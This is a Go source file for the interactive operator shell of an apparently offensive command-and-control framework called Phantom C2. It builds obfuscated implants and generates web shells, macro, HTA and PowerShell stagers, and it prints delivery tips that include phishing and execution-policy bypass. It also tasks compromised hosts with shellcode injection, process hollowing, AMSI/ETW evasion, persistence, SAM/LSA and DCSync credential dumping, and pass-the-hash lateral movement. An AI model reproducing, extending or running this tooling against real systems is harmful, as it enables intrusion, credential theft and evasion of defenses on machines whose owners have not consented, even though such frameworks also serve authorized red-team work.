package cli

import (
	"bufio"
	"fmt"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/phantom-c2/phantom/internal/agent"
	"github.com/phantom-c2/phantom/internal/db"
	"github.com/phantom-c2/phantom/internal/payloads"
	"github.com/phantom-c2/phantom/internal/protocol"
	"github.com/phantom-c2/phantom/internal/server"
	"github.com/phantom-c2/phantom/internal/util"
)

// Shell is the interactive CLI shell for Phantom.
type Shell struct {
	server      *server.Server
	scanner     *bufio.Scanner
	activeAgent *db.Agent // currently interacting agent
	running     bool
}

// NewShell creates a new CLI shell.
func NewShell(srv *server.Server) *Shell {
	return &Shell{
		server:  srv,
		scanner: bufio.NewScanner(os.Stdin),
		running: true,
	}
}

// Run starts the interactive shell loop.
func (sh *Shell) Run() {
	// Handle Ctrl+C gracefully
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println()
		Info("Shutting down...")
		sh.server.Shutdown()
		os.Exit(0)
	}()

	// Register event handler for live notifications
	sh.server.OnEvent = sh.onEvent

	for sh.running {
		sh.printPrompt()

		if !sh.scanner.Scan() {
			break
		}

		line := strings.TrimSpace(sh.scanner.Text())
		if line == "" {
			continue
		}

		sh.execute(line)
	}
}

// printPrompt displays the CLI prompt.
func (sh *Shell) printPrompt() {
	if sh.activeAgent != nil {
		fmt.Printf("\n  %sphantom%s [%s%s%s] > ", colorPurple, colorReset, colorCyan, sh.activeAgent.Name, colorReset)
	} else {
		fmt.Printf("\n  %sphantom%s > ", colorPurple, colorReset)
	}
}

// execute dispatches a command.
func (sh *Shell) execute(line string) {
	parts := strings.Fields(line)
	if len(parts) == 0 {
		return
	}

	cmd := strings.ToLower(parts[0])
	args := parts[1:]

	// If interacting with an agent, handle agent commands
	if sh.activeAgent != nil {
		sh.executeAgentCmd(cmd, args)
		return
	}

	// Global commands
	switch cmd {
	case "help", "?":
		sh.cmdHelp()
	case "agents", "sessions":
		sh.cmdAgents()
	case "interact", "use":
		sh.cmdInteract(args)
	case "listeners":
		sh.cmdListeners(args)
	case "tasks":
		sh.cmdTasks(args)
	case "generate", "payload", "build":
		sh.cmdGenerate(args)
	case "events", "log":
		sh.cmdEvents()
	case "remove", "rm":
		sh.cmdRemoveAgent(args)
	case "loot":
		sh.cmdLoot(args)
	case "clear", "cls":
		fmt.Print("\033[H\033[2J")
	case "exit", "quit":
		Info("Shutting down...")
		sh.server.Shutdown()
		sh.running = false
	default:
		Error("Unknown command: %s (type 'help' for available commands)", cmd)
	}
}

// executeAgentCmd handles commands within an agent interaction.
func (sh *Shell) executeAgentCmd(cmd string, args []string) {
	switch cmd {
	case "help", "?":
		sh.cmdAgentHelp()
	case "back", "bg", "exit":
		Info("Returning to main menu")
		sh.activeAgent = nil
	case "info":
		sh.cmdAgentInfo()
	case "shell", "exec", "cmd":
		sh.cmdShell(args)
	case "upload":
		sh.cmdUpload(args)
	case "download":
		sh.cmdDownload(args)
	case "screenshot":
		sh.cmdScreenshot()
	case "ps":
		sh.cmdProcessList()
	case "sysinfo":
		sh.cmdSysinfo()
	case "persist":
		sh.cmdPersist(args)
	case "sleep":
		sh.cmdSleep(args)
	case "cd":
		sh.cmdCd(args)
	case "kill":
		sh.cmdKill()
	case "tasks":
		sh.cmdAgentTasks()
	case "bof":
		sh.cmdBOF(args)
	case "shellcode":
		sh.cmdShellcode(args)
	case "inject":
		sh.cmdInject(args)
	case "hollow":
		sh.cmdHollow(args)
	case "evasion":
		sh.cmdEvasion()
	default:
		// Check if it's an AD command
		if strings.HasPrefix(cmd, "ad-") {
			sh.cmdAD(cmd, args)
			return
		}
		// Treat as shell command
		sh.cmdShell(append([]string{cmd}, args...))
	}
}

// ─────────────── Global Commands ───────────────

func (sh *Shell) cmdHelp() {
	fmt.Println()
	fmt.Printf("  %s%sPhantom C2 — Commands%s\n", colorBold, colorPurple, colorReset)
	fmt.Printf("  %s─────────────────────────────────────────%s\n", colorDim, colorReset)
	fmt.Println()

	cmds := [][]string{
		{"agents", "List all connected agents"},
		{"interact <name|id>", "Interact with an agent"},
		{"listeners [start|stop] <name>", "Manage listeners"},
		{"tasks [agent]", "View task history"},
		{"generate <type> [url]", "Build agent or generate payload"},
		{"remove <name|id>", "Remove a dead agent"},
		{"loot [agent]", "View captured loot"},
		{"events", "View event log"},
		{"clear", "Clear screen"},
		{"help", "Show this help"},
		{"exit", "Shutdown and exit"},
	}

	for _, c := range cmds {
		fmt.Printf("  %s%-30s%s %s%s%s\n", colorCyan, c[0], colorReset, colorDim, c[1], colorReset)
	}
	fmt.Println()
}

func (sh *Shell) cmdAgents() {
	agents, err := sh.server.AgentMgr.List()
	if err != nil {
		Error("Failed to list agents: %v", err)
		return
	}

	if len(agents) == 0 {
		Warn("No agents connected")
		return
	}

	// Refresh statuses
	sh.server.AgentMgr.RefreshStatuses()
	agents, _ = sh.server.AgentMgr.List()

	t := NewTable("ID", "Name", "OS", "Hostname", "User", "IP", "Sleep", "Last Seen", "Status")
	for _, a := range agents {
		t.AddRow(
			util.ShortID(a.ID),
			a.Name,
			a.OS,
			a.Hostname,
			a.Username,
			a.ExternalIP,
			fmt.Sprintf("%ds/%d%%", a.Sleep, a.Jitter),
			util.TimeAgo(a.LastSeen),
			a.Status,
		)
	}
	fmt.Println()
	t.Render()
}

func (sh *Shell) cmdInteract(args []string) {
	if len(args) == 0 {
		Error("Usage: interact <agent-name|agent-id>")
		return
	}

	agent, err := sh.server.AgentMgr.Get(args[0])
	if err != nil {
		Error("Error: %v", err)
		return
	}
	if agent == nil {
		Error("Agent not found: %s", args[0])
		return
	}

	sh.activeAgent = agent
	Success("Interacting with %s (%s@%s)", agent.Name, agent.Username, agent.Hostname)
}

func (sh *Shell) cmdListeners(args []string) {
	if len(args) == 0 {
		// List all listeners
		listeners := sh.server.ListenerMgr.List()
		if len(listeners) == 0 {
			Warn("No listeners configured")
			return
		}

		t := NewTable("Name", "Type", "Bind Address", "Status")
		for _, l := range listeners {
			status := "stopped"
			if l.IsRunning() {
				status = "running"
			}
			t.AddRow(l.Name, strings.ToUpper(l.Type), l.BindAddr, status)
		}
		fmt.Println()
		t.Render()
		return
	}

	action := strings.ToLower(args[0])
	switch action {
	case "start":
		if len(args) < 2 {
			Error("Usage: listeners start <name>")
			return
		}
		if err := sh.server.StartListener(args[1]); err != nil {
			Error("Failed to start listener: %v", err)
		} else {
			Success("Listener %s started", args[1])
		}
	case "stop":
		if len(args) < 2 {
			Error("Usage: listeners stop <name>")
			return
		}
		if err := sh.server.StopListener(args[1]); err != nil {
			Error("Failed to stop listener: %v", err)
		} else {
			Success("Listener %s stopped", args[1])
		}
	default:
		Error("Unknown action: %s (use: start, stop)", action)
	}
}

func (sh *Shell) cmdTasks(args []string) {
	agentID := ""
	if len(args) > 0 {
		a, err := sh.server.AgentMgr.Get(args[0])
		if err != nil || a == nil {
			Error("Agent not found: %s", args[0])
			return
		}
		agentID = a.ID
	}

	var allTasks []*db.TaskRecord
	if agentID != "" {
		tasks, err := sh.server.TaskDisp.GetTaskHistory(agentID)
		if err != nil {
			Error("Failed to get tasks: %v", err)
			return
		}
		allTasks = tasks
	} else {
		// Get tasks for all agents
		agents, _ := sh.server.AgentMgr.List()
		for _, a := range agents {
			tasks, _ := sh.server.TaskDisp.GetTaskHistory(a.ID)
			allTasks = append(allTasks, tasks...)
		}
	}

	if len(allTasks) == 0 {
		Warn("No tasks found")
		return
	}

	t := NewTable("ID", "Agent", "Type", "Args", "Status", "Created")
	for _, task := range allTasks {
		agentName := util.ShortID(task.AgentID)
		a, _ := sh.server.AgentMgr.Get(task.AgentID)
		if a != nil {
			agentName = a.Name
		}

		argsStr := strings.Join(task.Args, " ")
		if len(argsStr) > 30 {
			argsStr = argsStr[:27] + "..."
		}

		t.AddRow(
			util.ShortID(task.ID),
			agentName,
			protocol.TaskTypeName(uint8(task.Type)),
			argsStr,
			protocol.StatusName(uint8(task.Status)),
			util.TimeAgo(task.CreatedAt),
		)
	}
	fmt.Println()
	t.Render()
}

func (sh *Shell) cmdGenerate(args []string) {
	fmt.Println()
	fmt.Printf("  %s%sPayload Generator%s\n", colorBold, colorPurple, colorReset)
	fmt.Printf("  %s─────────────────────────────────────────────────────────%s\n", colorDim, colorReset)
	fmt.Println()

	fmt.Printf("  %sAgent Binaries (cross-compiled, built from CLI):%s\n", colorYellow, colorReset)
	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate exe [listener_url]", colorReset, colorDim, "Windows EXE agent (amd64)", colorReset)
	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate elf [listener_url]", colorReset, colorDim, "Linux ELF agent (amd64)", colorReset)
	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate exe-garble [listener_url]", colorReset, colorDim, "Obfuscated Windows EXE (garble)", colorReset)
	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate elf-garble [listener_url]", colorReset, colorDim, "Obfuscated Linux ELF (garble)", colorReset)
	fmt.Println()

	fmt.Printf("  %sWeb Shells (stealthy, token-protected):%s\n", colorYellow, colorReset)
	pTypes := payloads.ListPayloadTypes()
	for _, pt := range pTypes {
		fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, fmt.Sprintf("generate %s [listener_url]", pt.Type), colorReset, colorDim, pt.Desc, colorReset)
	}
	fmt.Println()

	// Handle generation if args provided
	if len(args) == 0 {
		return
	}

	pType := strings.ToLower(args[0])
	listenerURL := "https://127.0.0.1:443"
	if len(args) > 1 {
		listenerURL = args[1]
	}

	// Agent binaries — build directly
	switch pType {
	case "exe":
		sh.buildAgent("windows", "amd64", listenerURL, false)
		return
	case "elf":
		sh.buildAgent("linux", "amd64", listenerURL, false)
		return
	case "exe-garble":
		sh.buildAgent("windows", "amd64", listenerURL, true)
		return
	case "elf-garble":
		sh.buildAgent("linux", "amd64", listenerURL, true)
		return
	}

	// Web shells and stagers
	cfg := payloads.PayloadConfig{
		Type:        payloads.PayloadType(pType),
		ListenerURL: listenerURL,
		OutputPath:  "build/payloads",
	}

	outPath, err := payloads.Generate(cfg)
	if err != nil {
		Error("Failed to generate payload: %v", err)
		return
	}

	Success("Payload generated: %s", outPath)

	// Show access instructions for web shells
	switch payloads.PayloadType(pType) {
	case payloads.PayloadASPX, payloads.PayloadPHP, payloads.PayloadJSP:
		token := fmt.Sprintf("%016x", hashString(listenerURL))
		Info("Upload to target web server, then access with:")
		fmt.Printf("  %scurl -X POST -H 'X-Debug-Token: %s' -d 'data=whoami' <url>%s\n", colorCyan, token, colorReset)
	case payloads.PayloadPowerShell:
		Info("Execute on target: powershell -ep bypass -f update.ps1")
	case payloads.PayloadBash:
		Info("Execute on target: bash update.sh")
	case payloads.PayloadPython:
		Info("Execute on target: python3 config.py")
	case payloads.PayloadHTA:
		Info("Deliver via phishing: mshta <url>/update.hta")
	case payloads.PayloadVBA:
		Info("Embed in Office document macro (AutoOpen)")
	}
}

func (sh *Shell) buildAgent(targetOS, arch, listenerURL string, obfuscate bool) {
	Info("Building %s/%s agent...", targetOS, arch)
	if obfuscate {
		Info("Obfuscation: garble (literals + tiny)")
	}

	cfg := agent.BuildConfig{
		OS:          targetOS,
		Arch:        arch,
		ListenerURL: listenerURL,
		Sleep:       sh.server.Config.Server.DefaultSleep,
		Jitter:      sh.server.Config.Server.DefaultJitter,
		ServerPub:   sh.server.PubKey,
		OutputDir:   "build/agents",
		Obfuscate:   obfuscate,
	}

	result, err := agent.BuildAgent(cfg)
	if err != nil {
		Error("Build failed: %v", err)
		return
	}

	Success("Agent built successfully!")
	fmt.Printf("  %-12s %s\n", "Output:", result.OutputPath)
	fmt.Printf("  %-12s %s\n", "Size:", agent.FormatSize(result.Size))
	fmt.Printf("  %-12s %s/%s\n", "Platform:", result.OS, result.Arch)
	fmt.Printf("  %-12s %s\n", "Listener:", listenerURL)
	fmt.Printf("  %-12s %ds / %d%%\n", "Sleep:", cfg.Sleep, cfg.Jitter)
	if obfuscate {
		fmt.Printf("  %-12s %s\n", "Obfuscation:", "garble (literals stripped)")
	}
	fmt.Println()
}

func hashString(s string) uint64 {
	h := uint64(0)
	for _, c := range s {
		h = h*31 + uint64(c)
	}
	return h
}

func (sh *Shell) cmdRemoveAgent(args []string) {
	if len(args) == 0 {
		Error("Usage: remove <agent-name|agent-id>")
		return
	}

	a, err := sh.server.AgentMgr.Get(args[0])
	if err != nil || a == nil {
		Error("Agent not found: %s", args[0])
		return
	}

	Warn("Remove agent '%s' (%s@%s)? This cannot be undone. (y/N): ", a.Name, a.Username, a.Hostname)
	if sh.scanner.Scan() {
		if strings.ToLower(strings.TrimSpace(sh.scanner.Text())) == "y" {
			if err := sh.server.AgentMgr.Remove(a.ID); err != nil {
				Error("Failed to remove: %v", err)
				return
			}
			Success("Agent '%s' removed", a.Name)
		}
	}
}

func (sh *Shell) cmdLoot(args []string) {
	agentID := ""
	if len(args) > 0 {
		a, err := sh.server.AgentMgr.Get(args[0])
		if err != nil || a == nil {
			Error("Agent not found: %s", args[0])
			return
		}
		agentID = a.ID
	}

	loot, err := sh.server.DB.ListLoot(agentID)
	if err != nil {
		Error("Failed to list loot: %v", err)
		return
	}

	if len(loot) == 0 {
		Warn("No loot captured yet")
		return
	}

	t := NewTable("ID", "Agent", "Type", "Name", "Created")
	for _, l := range loot {
		agentName := util.ShortID(l.AgentID)
		a, _ := sh.server.AgentMgr.Get(l.AgentID)
		if a != nil {
			agentName = a.Name
		}
		t.AddRow(util.ShortID(l.ID), agentName, l.Type, l.Name, util.TimeAgo(l.CreatedAt))
	}
	fmt.Println()
	t.Render()
}

func (sh *Shell) cmdEvents() {
	if len(sh.server.EventLog) == 0 {
		Warn("No events recorded")
		return
	}

	fmt.Println()
	for _, e := range sh.server.EventLog {
		fmt.Printf("  %s%s%s\n", colorDim, e, colorReset)
	}
}

// ─────────────── Agent Commands ───────────────

func (sh *Shell) cmdAgentHelp() {
	fmt.Println()
	fmt.Printf("  %s%sAgent Commands — %s%s\n", colorBold, colorCyan, sh.activeAgent.Name, colorReset)
	fmt.Printf("  %s─────────────────────────────────────────%s\n", colorDim, colorReset)
	fmt.Println()

	cmds := [][]string{
		{"shell <command>", "Execute a shell command"},
		{"upload <local> <remote>", "Upload file to agent"},
		{"download <remote>", "Download file from agent"},
		{"screenshot", "Capture screenshot"},
		{"ps", "List running processes"},
		{"sysinfo", "Get system information"},
		{"persist <method>", "Install persistence (registry|cron|service)"},
		{"sleep <sec> [jitter%]", "Change sleep interval"},
		{"cd <path>", "Change working directory"},
		{"kill", "Terminate the agent"},
		{"info", "Show agent details"},
		{"tasks", "Show task history for this agent"},
		{"bof <file> [args]", "Execute Beacon Object File (in-memory)"},
		{"shellcode <file>", "Execute raw shellcode in-memory"},
		{"inject <pid> <file>", "Inject shellcode into remote process"},
		{"hollow <exe> <file>", "Process hollowing (spawn + inject)"},
		{"evasion", "Re-run evasion (AMSI/ETW/unhook)"},
		{"ad-*", "Active Directory commands (type 'ad-help')"},
		{"back", "Return to main menu"},
	}

	for _, c := range cmds {
		fmt.Printf("  %s%-28s%s %s%s%s\n", colorCyan, c[0], colorReset, colorDim, c[1], colorReset)
	}
	fmt.Println()
}

func (sh *Shell) cmdAgentInfo() {
	a := sh.activeAgent
	fmt.Println()
	fmt.Printf("  %s%sAgent: %s%s\n", colorBold, colorCyan, a.Name, colorReset)
	fmt.Printf("  %s─────────────────────────────────────────%s\n", colorDim, colorReset)
	fmt.Printf("  %-15s %s\n", "ID:", a.ID)
	fmt.Printf("  %-15s %s\n", "Name:", a.Name)
	fmt.Printf("  %-15s %s\n", "Hostname:", a.Hostname)
	fmt.Printf("  %-15s %s\n", "Username:", a.Username)
	fmt.Printf("  %-15s %s / %s\n", "OS/Arch:", a.OS, a.Arch)
	fmt.Printf("  %-15s %d (%s)\n", "PID:", a.PID, a.ProcessName)
	fmt.Printf("  %-15s %s\n", "Internal IP:", a.InternalIP)
	fmt.Printf("  %-15s %s\n", "External IP:", a.ExternalIP)
	fmt.Printf("  %-15s %ds / %d%% jitter\n", "Sleep:", a.Sleep, a.Jitter)
	fmt.Printf("  %-15s %s\n", "First Seen:", util.FormatTimestamp(a.FirstSeen))
	fmt.Printf("  %-15s %s (%s)\n", "Last Seen:", util.FormatTimestamp(a.LastSeen), util.TimeAgo(a.LastSeen))
	fmt.Printf("  %-15s %s\n", "Status:", a.Status)
	fmt.Println()
}

func (sh *Shell) queueTask(taskType uint8, args []string, data []byte) {
	task, err := sh.server.TaskDisp.CreateTask(sh.activeAgent.ID, taskType, args, data)
	if err != nil {
		Error("Failed to create task: %v", err)
		return
	}
	Success("Task queued (ID: %s) — waiting for agent check-in...", util.ShortID(task.ID))
}

func (sh *Shell) cmdShell(args []string) {
	if len(args) == 0 {
		Error("Usage: shell <command>")
		return
	}
	sh.queueTask(protocol.TaskShell, args, nil)
}

func (sh *Shell) cmdUpload(args []string) {
	if len(args) < 2 {
		Error("Usage: upload <local-path> <remote-path>")
		return
	}

	data, err := os.ReadFile(args[0])
	if err != nil {
		Error("Failed to read file: %v", err)
		return
	}

	sh.queueTask(protocol.TaskUpload, []string{args[1]}, data)
	Info("File size: %d bytes", len(data))
}

func (sh *Shell) cmdDownload(args []string) {
	if len(args) == 0 {
		Error("Usage: download <remote-path>")
		return
	}
	sh.queueTask(protocol.TaskDownload, args, nil)
}

func (sh *Shell) cmdScreenshot() {
	sh.queueTask(protocol.TaskScreenshot, nil, nil)
}

func (sh *Shell) cmdProcessList() {
	sh.queueTask(protocol.TaskProcessList, nil, nil)
}

func (sh *Shell) cmdSysinfo() {
	sh.queueTask(protocol.TaskSysinfo, nil, nil)
}

func (sh *Shell) cmdPersist(args []string) {
	if len(args) == 0 {
		Error("Usage: persist <method>")
		Info("Methods: registry, cron, service, bashrc, schtask")
		return
	}
	sh.queueTask(protocol.TaskPersist, args, nil)
}

func (sh *Shell) cmdSleep(args []string) {
	if len(args) == 0 {
		Error("Usage: sleep <seconds> [jitter%%]")
		return
	}

	sleep, err := strconv.Atoi(args[0])
	if err != nil || sleep < 1 {
		Error("Invalid sleep value")
		return
	}

	jitter := sh.activeAgent.Jitter
	if len(args) > 1 {
		j, err := strconv.Atoi(args[1])
		if err == nil && j >= 0 && j <= 50 {
			jitter = j
		}
	}

	sh.server.AgentMgr.UpdateSleep(sh.activeAgent.ID, sleep, jitter)
	sh.queueTask(protocol.TaskSleep, []string{args[0], strconv.Itoa(jitter)}, nil)
	Success("Sleep set to %ds with %d%% jitter", sleep, jitter)
}

func (sh *Shell) cmdCd(args []string) {
	if len(args) == 0 {
		Error("Usage: cd <path>")
		return
	}
	sh.queueTask(protocol.TaskCd, args, nil)
}

func (sh *Shell) cmdKill() {
	Warn("This will terminate the agent. Are you sure? (y/N): ")
	if sh.scanner.Scan() {
		if strings.ToLower(strings.TrimSpace(sh.scanner.Text())) == "y" {
			sh.queueTask(protocol.TaskKill, nil, nil)
			Warn("Kill task queued — agent will terminate on next check-in")
			sh.activeAgent = nil
		}
	}
}

func (sh *Shell) cmdAgentTasks() {
	tasks, err := sh.server.TaskDisp.GetTaskHistory(sh.activeAgent.ID)
	if err != nil {
		Error("Failed to get tasks: %v", err)
		return
	}

	if len(tasks) == 0 {
		Warn("No tasks for this agent")
		return
	}

	t := NewTable("ID", "Type", "Args", "Status", "Created")
	for _, task := range tasks {
		argsStr := strings.Join(task.Args, " ")
		if len(argsStr) > 35 {
			argsStr = argsStr[:32] + "..."
		}

		t.AddRow(
			util.ShortID(task.ID),
			protocol.TaskTypeName(uint8(task.Type)),
			argsStr,
			protocol.StatusName(uint8(task.Status)),
			util.TimeAgo(task.CreatedAt),
		)
	}
	fmt.Println()
	t.Render()

	// Show latest result if available
	if len(tasks) > 0 && tasks[0].Status == int(protocol.StatusComplete) {
		result, _ := sh.server.TaskDisp.GetResult(tasks[0].ID)
		if result != nil && len(result.Output) > 0 {
			fmt.Printf("\n  %sLatest result:%s\n", colorDim, colorReset)
			fmt.Printf("  %s\n", string(result.Output))
		}
	}
}

func (sh *Shell) cmdShellcode(args []string) {
	if len(args) == 0 {
		Error("Usage: shellcode <bin-file>")
		Info("Executes raw shellcode in the agent's process memory (no disk touch)")
		return
	}

	data, err := os.ReadFile(args[0])
	if err != nil {
		Error("Failed to read shellcode file: %v", err)
		return
	}

	sh.queueTask(protocol.TaskShellcode, nil, data)
	Info("Shellcode size: %d bytes (in-memory execution)", len(data))
}

func (sh *Shell) cmdInject(args []string) {
	if len(args) < 2 {
		Error("Usage: inject <pid> <shellcode-file>")
		Info("Injects shellcode into a remote process (Windows: CreateRemoteThread)")
		return
	}

	data, err := os.ReadFile(args[1])
	if err != nil {
		Error("Failed to read shellcode file: %v", err)
		return
	}

	sh.queueTask(protocol.TaskInject, []string{args[0]}, data)
	Info("Injecting %d bytes into PID %s", len(data), args[0])
}

func (sh *Shell) cmdHollow(args []string) {
	if len(args) < 2 {
		Error("Usage: hollow <host-exe> <shellcode-file>")
		Info("Example: hollow C:\\Windows\\System32\\svchost.exe /path/to/payload.bin")
		Info("Spawns the host process suspended, injects payload, and resumes")
		return
	}

	data, err := os.ReadFile(args[1])
	if err != nil {
		Error("Failed to read shellcode file: %v", err)
		return
	}

	sh.queueTask(protocol.TaskHollow, []string{args[0]}, data)
	Info("Hollowing %s with %d bytes payload", args[0], len(data))
}

func (sh *Shell) cmdEvasion() {
	Info("Re-running evasion techniques on agent (AMSI, ETW, ntdll unhook)...")
	sh.queueTask(protocol.TaskEvasion, nil, nil)
}

func (sh *Shell) cmdAD(cmd string, args []string) {
	if cmd == "ad-help" {
		sh.cmdADHelp()
		return
	}
	sh.queueTask(protocol.TaskAD, append([]string{cmd}, args...), nil)
}

func (sh *Shell) cmdADHelp() {
	fmt.Println()
	fmt.Printf("  %s%sActive Directory Commands%s\n", colorBold, colorPurple, colorReset)
	fmt.Printf("  %s─────────────────────────────────────────────────────────%s\n", colorDim, colorReset)
	fmt.Println()

	sections := []struct {
		title string
		cmds  [][]string
	}{
		{"Enumeration", [][]string{
			{"ad-enum-domain", "Enumerate domain info (DCs, forest)"},
			{"ad-enum-users [user]", "Enumerate domain users"},
			{"ad-enum-groups [group]", "Enumerate groups and memberships"},
			{"ad-enum-computers", "Enumerate domain computers"},
			{"ad-enum-shares [target]", "Enumerate SMB shares"},
			{"ad-enum-spns", "Enumerate SPNs (Kerberoastable)"},
			{"ad-enum-gpo", "Enumerate Group Policy Objects"},
			{"ad-enum-trusts", "Enumerate domain trusts"},
			{"ad-enum-admins", "Enumerate Domain/Enterprise Admins"},
			{"ad-enum-asrep", "Find AS-REP roastable accounts"},
			{"ad-enum-delegation", "Find delegation configurations"},
			{"ad-enum-laps", "Read LAPS passwords (if permitted)"},
		}},
		{"Attacks", [][]string{
			{"ad-kerberoast", "Request TGS tickets for SPN accounts"},
			{"ad-asreproast", "AS-REP Roast (no preauth accounts)"},
			{"ad-dcsync <DOMAIN/user>", "DCSync password replication (DA required)"},
		}},
		{"Credential Access", [][]string{
			{"ad-dump-sam", "Dump SAM database hives"},
			{"ad-dump-lsa", "Dump LSA secrets"},
			{"ad-dump-tickets", "Dump Kerberos tickets"},
		}},
		{"Lateral Movement", [][]string{
			{"ad-psexec <target> <cmd>", "PsExec remote execution"},
			{"ad-wmi <target> <cmd>", "WMI remote execution"},
			{"ad-winrm <target> <cmd>", "WinRM remote execution"},
			{"ad-pass-the-hash <t> <u> <h>", "Pass-the-Hash authentication"},
		}},
	}

	for _, section := range sections {
		fmt.Printf("  %s%s%s\n", colorYellow, section.title, colorReset)
		for _, c := range section.cmds {
			fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, c[0], colorReset, colorDim, c[1], colorReset)
		}
		fmt.Println()
	}
}

func (sh *Shell) cmdBOF(args []string) {
	if len(args) == 0 {
		Error("Usage: bof <object-file> [args...]")
		Info("Example: bof /path/to/whoami.o")
		return
	}

	// Read BOF file
	data, err := os.ReadFile(args[0])
	if err != nil {
		Error("Failed to read BOF file: %v", err)
		return
	}

	bofArgs := args[1:]
	sh.queueTask(protocol.TaskBOF, bofArgs, data)
	Info("BOF size: %d bytes", len(data))
}

// onEvent handles real-time events from the server.
func (sh *Shell) onEvent(event string, args ...interface{}) {
	timestamp := time.Now().Format("15:04:05")

	switch event {
	case "agent_register":
		fmt.Printf("\r  %s[%s]%s %s%s New agent: %v%s\n", colorGreen, timestamp, colorReset, colorBold, colorGreen, args, colorReset)
		sh.printPrompt()
	case "task_result":
		if len(args) >= 2 {
			taskID, _ := args[1].(string)
			agentID, _ := args[0].(string)

			// Look up the task result
			result, _ := sh.server.TaskDisp.GetResult(taskID)
			if result != nil && (len(result.Output) > 0 || result.Error != "") {
				// Get agent name for display
				agentName := util.ShortID(agentID)
				a, _ := sh.server.AgentMgr.Get(agentID)
				if a != nil {
					agentName = a.Name
				}

				// Get the task to show what command was run
				tasks, _ := sh.server.TaskDisp.GetTaskHistory(agentID)
				taskDesc := ""
				for _, t := range tasks {
					if t.ID == taskID {
						taskDesc = protocol.TaskTypeName(uint8(t.Type))
						if len(t.Args) > 0 {
							taskDesc += " " + strings.Join(t.Args, " ")
						}
						break
					}
				}

				fmt.Printf("\r\n")
				fmt.Printf("  %s[%s]%s %sResult from %s%s — %s\n", colorGreen, timestamp, colorReset, colorBold, agentName, colorReset, taskDesc)

				if result.Error != "" {
					fmt.Printf("  %s[-] Error: %s%s\n", colorRed, result.Error, colorReset)
				} else {
					output := string(result.Output)
					lines := strings.Split(strings.TrimRight(output, "\n"), "\n")
					for _, line := range lines {
						fmt.Printf("  %s%s%s\n", colorWhite, line, colorReset)
					}
				}
			} else {
				fmt.Printf("\r  %s[%s]%s Task result received (ID: %s)\n", colorCyan, timestamp, colorReset, util.ShortID(taskID))
			}
		}
		sh.printPrompt()
	case "listener_start":
		fmt.Printf("\r  %s[%s]%s Listener %v started (%v on %v)\n", colorGreen, timestamp, colorReset, args[0], args[1], args[2])
	case "listener_stop":
		fmt.Printf("\r  %s[%s]%s Listener %v stopped\n", colorYellow, timestamp, colorReset, args[0])
	case "listener_error":
		fmt.Printf("\r  %s[%s]%s %sListener %v error: %v%s\n", colorRed, timestamp, colorReset, colorRed, args[0], args[1], colorReset)
	}
}
